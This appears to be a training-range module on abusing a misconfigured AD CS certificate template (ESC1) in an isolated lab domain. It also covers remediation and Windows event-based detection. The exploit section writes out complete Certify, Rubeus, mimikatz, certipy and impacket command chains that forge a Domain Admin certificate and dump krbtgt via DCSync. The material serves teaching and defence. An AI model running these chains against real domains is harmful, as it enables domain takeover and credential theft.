# AP05 — AD CS ESC1 (Enrollee-Supplies-Subject) on a hybrid DC

**Layer:** Hybrid — AD DS + AD CS on-prem over Azure IaaS (`hybrid-ad` module)  
**Cost:** the **most expensive** AP in the range — the only **always-on Windows** VM. `Standard_B2ms` ~EUR 0.083/h (~EUR 60/month 24x7) or `Standard_B2s` as the floor (~EUR 0.041/h, ~EUR 30/month); a 127 GiB StandardSSD disk ~EUR 8-10/month; a Standard public IP ~EUR 3-4/month; Log Analytics ingestion (5 filtered EventIDs, ~0.1-0.3 GB/day) a few EUR/month. With daily **auto-shutdown** (2200) and ~8 h/day usage it drops to ~1/3 → roughly **~EUR 20-40/month**; `./azrange.ps1 destroy` takes it to 0. (West Europe, pay-as-you-go; a **Windows** VM rate includes the OS license, so Linux price lists understate it — treat these as rough figures and confirm with the Azure Pricing Calculator.)  
**MITRE ATT&CK:** [T1649](https://attack.mitre.org/techniques/T1649/) (Steal or Forge Authentication Certificates — *core: AD CS*) · [T1550](https://attack.mitre.org/techniques/T1550/) (Use Alternate Authentication Material — *Pass-the-Certificate* via PKINIT) · [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync)  
**Maps to cert:** CRTO / CRTE (AD CS abuse + Kerberos PKINIT + DCSync; adjacent defensive side: SC-200 / Microsoft Defender for Identity)  
**Precondition seeded by the range:** the `azrange.lab` forest + Enterprise Root CA `azrange-CA`, both on a single Windows Server 2022 VM; a **low-privilege** user `ap05user` (UPN `ap05user@azrange.lab`, member of `Domain Users` only); and the **vulnerable** certificate template `AzRangeAuthESC1`, seeded by `scripts/seed-ap05.ps1` via `az vm run-command` during `deploy` (exact symmetry with `seed-ap01.ps1`). CA and Kerberos auditing (essential for the 🔵 layer) is enabled by the **DSC baseline**, not the seed. **What is NOT seeded:** any Domain Admin credential — the DA is **compromised by forging the certificate**.

---

## 🎯 Learning objective

For the student to internalize that **a misconfigured certificate template is a domain-takeover primitive**: ESC1 turns *any domain user* into *any Domain Admin* without stealing a single password, without first touching the DC's LSASS, and with no administrative role to start from. The attacker does not steal a privileged identity: they **manufacture** it by asking the CA for an authentication certificate whose *subject* (the SAN) they choose themselves.

The conceptual axis is a single *load-bearing* attribute: `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1`) in `msPKI-Certificate-Name-Flag`. That bit — and only that bit — lets the requester dictate the identity the certificate will authenticate. Combined with an authentication EKU, enrollment rights for low-privilege principals, no manager approval, and no RA signatures, the chain is deterministic.

The **five conditions of ESC1** (all simultaneous) that the range seeds into `AzRangeAuthESC1` — the map of the exploit and, mirrored, that of the remediation:

1. **Low-privilege enroll (C1):** `Domain Users` has the Certificate-Enrollment *extended right* (`0e10c968-78fb-11d2-90d4-00c04f79dc55`) in the `nTSecurityDescriptor` → `ap05user` inherits Enroll.
2. **No manager approval (C2):** `msPKI-Enrollment-Flag` **without** `CT_FLAG_PEND_ALL_REQUESTS` (`0x2`).
3. **No RA signatures (C3):** `msPKI-RA-Signature = 0`.
4. **Client authentication EKU (C4):** `pKIExtendedKeyUsage` / `msPKI-Certificate-Application-Policy` include `1.3.6.1.5.5.7.3.2` (Client Authentication; Smart Card Logon `1.3.6.1.4.1.311.20.2.2`, PKINIT Client Auth `1.3.6.1.5.2.3.4`, Any Purpose `2.5.29.37.0`, or SubCA are equivalent).
5. **Enrollee-supplies-subject (C5 — the core):** `msPKI-Certificate-Name-Flag` **with** `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1`) → the requester dictates the SAN. *Note: `0x1` lives in `msPKI-Certificate-Name-Flag`, **not** in `msPKI-Enrollment-Flag` (a common mix-up); manager approval — `0x2` — does live in `msPKI-Enrollment-Flag`.*

Break **any** of the five and ESC1 dies: that is why the 🟢 section offers several independent cuts.

**Contrast with AP01-AP04 (identity-only Entra) — the range's first hybrid layer.** AP01-AP04 escalate inside Microsoft Entra ID through role or credential grants (consent, group ownership, app ownership). AP05 drops down to **on-prem AD CS**: the escalation is **cryptographic** (forge an authentication certificate and use it over PKINIT), and the telemetry is no longer Entra cloud logs (`AuditLogs`/`SigninLogs`) but **Windows Security events** from the DC/CA (`SecurityEvent`), which **do not exist in any SIEM** unless the range ingests them (see 🔵). As a trade-off, the entire vulnerable surface lives on **a single disposable VM**: the reset leaves no *out-of-state* residue (as clean as AP07).

---

## 🔴 Exploit (how it is exploited)

> Authorized training lab, your own test tenant/subscription. The `azrange.lab` forest is isolated and does **not** sync with any tenant (that would be AP06). Every step starts from `ap05user` (low privilege); the Domain Admin is not known in advance.

The canonical chain is `ESC1 enrollment → cert with SAN = a DA's UPN → PKINIT → DA's TGT → DCSync`. The range provides **two routes** depending on the network posture the operator chooses.

### Route A — native Windows over RDP (primary UX, no AD ports exposed)

The module's NSG does **not** open LDAP/Kerberos/RPC to the Internet. The intended path is RDP to the DC (from `admin_source_cidr`) and running the Windows-native tools **as `ap05user`**. Reference: **Certify.exe** + **Rubeus.exe** + **mimikatz** (GhostPack).

```powershell
# RDP to <ap05_dc_public_ip> as AZRANGE\ap05user (source = admin_source_cidr)

# 1. Enumerate vulnerable templates (ESC1)
.\Certify.exe find /vulnerable
#   → AzRangeAuthESC1: ENROLLEE_SUPPLIES_SUBJECT + Client Authentication + Enroll for Domain Users

# 2. Request the cert, setting SAN = a Domain Admin's UPN
.\Certify.exe request /ca:dc.azrange.lab\azrange-CA /template:AzRangeAuthESC1 /altname:administrator
#   → copy the PEM block (private key + cert) to cert.pem

# 3. PEM → PFX (Rubeus consumes PFX)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
#   (set a password on the PFX; Rubeus asks for it in step 4)

# 4. PKINIT: request the DA's TGT with the forged cert and inject it into the session
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:<pfxpass> /ptt

# 5. DCSync krbtgt (or /all) with the already-injected TGT
.\mimikatz.exe "lsadump::dcsync /domain:azrange.lab /user:krbtgt" exit
```

### Route B — remote certipy (only if the operator opened the AD ports to `admin_source_cidr`)

If the operator relaxes the NSG to expose LDAP/Kerberos/RPC to their `/32`, the equivalent flow from a Linux attacker box with **certipy** (`ly4k`) + **impacket**:

```bash
# 1. Enumerate vulnerable templates as the low-privilege user
certipy find -u 'ap05user@azrange.lab' -p '<ap05user_pass>' \
  -dc-ip <ap05_dc_public_ip> -vulnerable -stdout
#   → flags AzRangeAuthESC1 as ESC1

# 2. Request the cert with SAN = a Domain Admin's UPN
certipy req -u 'ap05user@azrange.lab' -p '<ap05user_pass>' \
  -dc-ip <ap05_dc_public_ip> -ca 'azrange-CA' \
  -template 'AzRangeAuthESC1' -upn 'administrator@azrange.lab'
#   → administrator.pfx

# 3. PKINIT with the forged cert → TGT + (UnPAC-the-hash) the DA's NT hash
certipy auth -pfx 'administrator.pfx' -dc-ip <ap05_dc_public_ip>
#   → administrator.ccache  +  administrator's NT hash

# 4. DCSync as Domain Admin (ticket or hash)
KRB5CCNAME=administrator.ccache impacket-secretsdump -k -no-pass \
  'azrange.lab/administrator@dc.azrange.lab' -just-dc-user 'AZRANGE/krbtgt'
#   alternative with the recovered hash:
#   impacket-secretsdump -hashes :<nt_hash> 'azrange.lab/administrator@<ap05_dc_public_ip>'
```

Graph-based discovery: **Certipy** flags the template as vulnerable directly; **BloodHound** (collector with AD CS support / `Certipy ... -bloodhound`) draws the enrollment edge from `ap05user` onto `AzRangeAuthESC1` and its path to Domain Admin.

> **Caveat — the SAN is set by the requester, not the template.** `AzRangeAuthESC1` does not "contain" administrator: the `ENROLLEE_SUPPLIES_SUBJECT` bit lets `-altname`/`-upn` inject it at request time. That is why pure ESC1 does **not** need `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA (that would be ESC6, a different and noisier route).

> **Caveat — KB5014754 / strong mapping.** The lab runs with `StrongCertificateBindingEnforcement = 1` (Compatibility) **on purpose**, so the KDC accepts the implicit UPN mapping and the forged PKINIT works. Under **Full Enforcement** (value `2`, or the default after the **September 9, 2025** security update) the KDC validates the certificate's SID extension (`szOID_NTDS_CA_SECURITY_EXT`, which carries the **requester's** SID `ap05user`, not the SAN's `administrator`) and **denies** the logon → the 🔴 chain fails and the lab *appears* "already patched." Recent certipy can embed a forged SID (`-sid`), but under Full Enforcement the forge still fails because the SID does not match the authenticated account. This **is** the real platform fix (see 🟢).

> **Caveat — propagation / auto-shutdown.** Run `deploy` + attack in the same session: a VM *deallocated* by the auto-shutdown (2200) serves neither RDP nor `az vm run-command`, and the DCPromo takes ~15-25 min to become `Compliant` after the first `apply`.

### Domain takeover

With the `krbtgt` hash from DCSync: **Golden Ticket** (full persistence), or directly administrator's NT hash for `pass-the-hash`, account creation, GPO modification, etc. The forged certificate is, moreover, **persistence in its own right**: it survives a DA password change and stays valid until it expires or the cert is revoked.

---

## 🟢 Remediate (remediation)

Each of these actions **cuts ESC1 independently** (breaks one of the five conditions). Apply them in depth.

1. **Remove `ENROLLEE_SUPPLIES_SUBJECT` (C5 — the direct antidote).** Have the CA build the *subject* from AD, not the requester. In the GUI (`certtmpl.msc`): *Subject Name* tab → **uncheck** "Supply in the request" → check "Build from this Active Directory information". At a low level: clear the `0x1` bit from `msPKI-Certificate-Name-Flag`.

2. **Require manager approval (C2).** Set `CT_FLAG_PEND_ALL_REQUESTS` (`0x2`) in `msPKI-Enrollment-Flag`: every request stays *pending* until a CA manager approves it → automatic issuance ends.

3. **Restrict the Enroll ACL (C1).** Remove the Certificate-Enrollment *extended right* from `Domain Users` / `Authenticated Users` and leave it only on explicit, audited principals. An authentication template should **never** be enrollable by the whole domain.

4. **Unpublish the template.** `certutil -SetCATemplates -AzRangeAuthESC1` (or *Certification Authority* → *Certificate Templates* → *Delete*). It removes the template from the *Enrollment Services* `certificateTemplates` → it stops being **requestable** even though the object still exists.

5. **CA hygiene — `EDITF_ATTRIBUTESUBJECTALTNAME2` (defense in depth, cuts ESC6).** Not required to neutralize pure ESC1, but a CA with this flag allows arbitrary SANs to be injected **in any** template: disable it.
   ```powershell
   certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
   net stop certsvc && net start certsvc
   ```

6. **KB5014754 — strong certificate mapping (platform / foundational control).** Moving the DCs to **Full Enforcement** (`StrongCertificateBindingEnforcement = 2`) means that, even with a misconfigured template, the KDC rejects a cert whose requester SID does not match the target account → the forge with a DA's SAN no longer authenticates. This is the reinforcement that renders the entire forged-SAN attack class ineffective.

> **KB5014754 as a teachable control.** The lab baseline sets `StrongCertificateBindingEnforcement = 1` (Compatibility) **on purpose**, so the forge is exploitable. Since the **February 2025** update, DCs move to **Full Enforcement** by default when the value is not configured, and the *opt-out* to Compatibility **is honored only until the September 9, 2025 security update**. If you patch the DC beyond that date, expect the forge to stop working (the 🔵 leg **still fires**: cert issuance and the PKINIT attempt are logged all the same, even though the final logon is blocked).

### In-place remediation in the range (the "Remediate" exercise)

`scripts/seed-ap05.ps1 -Remediate` fixes the template **while leaving the DC/CA/telemetry standing**, so the student can re-run the attack and detection against the already-corrected state and confirm that `certipy find` stops flagging it `-vulnerable`. It applies several cuts at once (clears `0x1` from `msPKI-Certificate-Name-Flag`, adds `0x2` to `msPKI-Enrollment-Flag`, and unpublishes). Invoked symmetrically with the `deploy` seed:

```bash
az vm run-command invoke \
  -g <ap05_resource_group> -n <ap05_dc_vm_name> \
  --command-id RunPowerShellScript \
  --scripts @scripts/seed-ap05.ps1 \
  --parameters Remediate=true EaPassword='<dc_admin_password>' \
               DomainFqdn=azrange.lab DomainNetbios=AZRANGE \
               TemplateName=AzRangeAuthESC1 CaCommonName=azrange-CA
```

> **Two reset levels — do not confuse them.** (1) **Hard / cost→0:** `./azrange.ps1 reset` re-applies with `enable_ap05 = false` (`count = 0`) → Terraform **destroys the entire VM** and, with it, atomically, the `AzRangeAuthESC1` template, the forged/issued certificates, and the CA DB. It is a reset with no *out-of-state* residue (tied with AP07 as the cleanest in the range): unlike AP02/AP03/AP04 (where the attacker's actions land *outside* Terraform state and must be cleaned up by hand), here the entire vulnerable surface lives on a disposable VM → zero *out-of-state* residue, zero subsequent cost. (2) **In-place / pedagogical:** `seed-ap05.ps1 -Remediate` (above). `./azrange.ps1 reset` does **not** pre-remediate AP05 via `run-command` (a deliberate divergence from AP01: the vuln lives on the destroyable VM, which may also be *deallocated* by auto-shutdown and would make the `run-command` fail). The template is **not** an `azurerm` resource (Terraform does not manage AD CS templates: they are objects in the DC's *Configuration NC*) — that very property is what yields the clean reset. On a **live** DC, `enable_ap05=false` destroys the VM (and the template), but does **not** "fix" a running DC until you re-apply/destroy; that is what `-Remediate` is for.

---

## 🔵 Detect

The source is **Windows Security events** from the DC/CA (on-prem — there are **no** Entra `AuditLogs`/`SigninLogs`). The `hybrid-ad` module **provisions the pipeline by default** (gated by `enable_ap05 && collect_security_events`): **Azure Monitor Agent (AMA)** + a **Data Collection Rule (DCR)** filtered to 5 EventIDs + **Log Analytics** (or an external Sentinel via `existing_log_analytics_workspace_id`). Without this pipeline the events **do not exist in any SIEM**, so "Detect" is only testable end to end if the range ingests them. KQL table: **`SecurityEvent`**.

- KQL (Sentinel / Defender XDR): [`../../detections/kql/AP05-adcs-esc1.kql`](../../detections/kql/AP05-adcs-esc1.kql)
- Sigma: [`../../detections/sigma/AP05-adcs-esc1.yml`](../../detections/sigma/AP05-adcs-esc1.yml)

**Signals (table `SecurityEvent`):**

| Signal | EventID | What to look at |
|---|---|---|
| Certificate request to the CA | `4886` | `CertificateTemplate == AzRangeAuthESC1`; *requester* = `ap05user` |
| **Issuance** of the certificate by the CA | `4887` | `CertificateTemplate == AzRangeAuthESC1` — *honeytemplate*: **any** issuance is suspicious in itself |
| Certificate-services template / security change | `4899` / `4900` | the **seeding** itself or tampering with the template (the defender *watches the vuln being planted*) |
| Kerberos TGT via **PKINIT** | `4768` | *Certificate Information* populated (`CertThumbprint`/`CertSerialNumber` non-empty, `PreAuthType = 16`); account = `administrator` |
| (Complementary, *System* channel, post-KB5014754) | `Kerberos-Key-Distribution-Center 39/41` | requester SID ≠ subject SID → weak mapping/rejection |

**Essential prerequisite (enabled by the DSC baseline, not the seed, so it persists across seed/remediate cycles):** CA auditing (`certutil -setreg CA\AuditFilter 127` + `auditpol` subcategory *Certification Services* + `Restart-Service certsvc`) for `4886/4887/4899/4900`, and *Audit Kerberos Authentication Service* (Success) for `4768`. Without this, **the events are not generated** and detection fails on empty. Since the DSC runs in `deploy` **before** the seed post-apply, seeding the template itself already fires `4899/4900` — a teaching point: the defender observes the vulnerability being planted.

**Correlation logic (lesson from AP04): OR, never a global AND.** The SAN does **not travel reliably** in `4886/4887` (it lives in the CA DB / `certutil -view`: `Request.RequesterName` vs. the issued cert's SAN), so the rule does **not** rely on a `requester != SAN` that would silently drop real detections. Each signal **fires on its own**: (a) any enrollment of the *honeytemplate* is suspicious; (b) a `4768` PKINIT for a privileged account; (c) a `4899/4900` outside an approved change window. The `4887 → 4768` correlation (same *thumbprint*/*serial*, different/privileged account, short window) is a **fidelity booster**, not a *gate*. `4768` is high volume (every TGT) → the KQL scopes it to PKINIT + *Certificate Information* to contain noise and cost.

**Managed complement:** **Microsoft Defender for Identity** brings **native ESC1 detection** (and the rest of the ESCx) on sensor-equipped DCs — recommended alongside these rules.

> **Ingestion cost.** A single-DC feed **filtered to 5 EventIDs** stays well below 0.1-0.3 GB/day → a few EUR/month (31 days of retention included). **Always** filter the DCR xPath to those EventIDs: an unfiltered *Security* channel blows up the Log Analytics cost. It is disabled with `collect_security_events = false` or by pointing to an external workspace.

---

## 📚 References

- SpecterOps — Will Schroeder & Lee Christensen, *Certified Pre-Owned: Abusing Active Directory Certificate Services* (definition and taxonomy of ESC1): [posts.specterops.io/certified-pre-owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- Microsoft — [KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/help/5014754) (`StrongCertificateBindingEnforcement`; Compatibility vs Full Enforcement; opt-out until 2025-09-09; events 39-41; `szOID_NTDS_CA_SECURITY_EXT` — validated 2026-11)
- HackTricks — [AD CS Domain Escalation (ESC1)](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation)
- Tools: **Certipy** ([github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)), **GhostPack Certify** ([github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)) + **Rubeus** ([github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)), **impacket** (`secretsdump`), **mimikatz** (`lsadump::dcsync`), **BloodHound** (AD CS support)
- Microsoft Learn — *Configure Certification Authority auditing* (`AuditFilter`), *Audit Kerberos Authentication Service* (event 4768), *Microsoft Defender for Identity — AD CS (ESC1) detections*
- MITRE ATT&CK — [T1649](https://attack.mitre.org/techniques/T1649/), [T1550](https://attack.mitre.org/techniques/T1550/), [T1003.006](https://attack.mitre.org/techniques/T1003/006/)
- Compare with [AP02](./AP02-managed-identity.md) — same VM/cost/auto-shutdown pattern (the only other AP that bills compute). The next hybrid layer (AP06 — Entra Connect / Seamless SSO) is **out of scope** here: AP05 is pure on-prem AD CS, with no synchronization to the tenant.
